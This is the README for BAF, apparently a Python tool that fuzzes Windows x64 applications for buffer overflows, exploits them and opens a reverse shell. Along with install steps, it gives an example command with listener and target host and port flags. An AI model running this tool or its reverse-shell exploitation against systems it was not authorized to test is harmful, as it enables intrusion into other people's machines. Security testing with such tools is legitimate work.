# BAF

Python Buffer Overflow scanner.

## Description

BAF is a tool used to scan Winx64 applications for Buffer Overflow Vulnerabilities. It's able to fuzz and exploit vulnerable applications and create a reverse shell.

## Getting Started

### Installation
```
git clone https://github.com/TralseDev/BAF.git
```

### Executing program

```
python3 main.py
```

### Examples:
```
python3 main.py --lhost 127.0.0.1 --lport 1337 --rhost 127.0.0.1 --rport 2337 --prefix="OVERFLOW_COMMAND" --timeout=5 --littleEndian
```

![](https://github.com/TralseDev/BAF/blob/main/examples/example.mp4)

## Help

```
python3 main.py -h
```

## Authors

Tralse

## Version History

* 1.0
    * Stable version
* 0.0
    * Beta phase

## License

This project is licensed under the GNU General Public License v3.0 (GNU GPLv3 License)

## TODOs
- offline scanner
- multi-threading
- save data to not restart all scans
- -o flag (for output > file -> logger/logging_file)
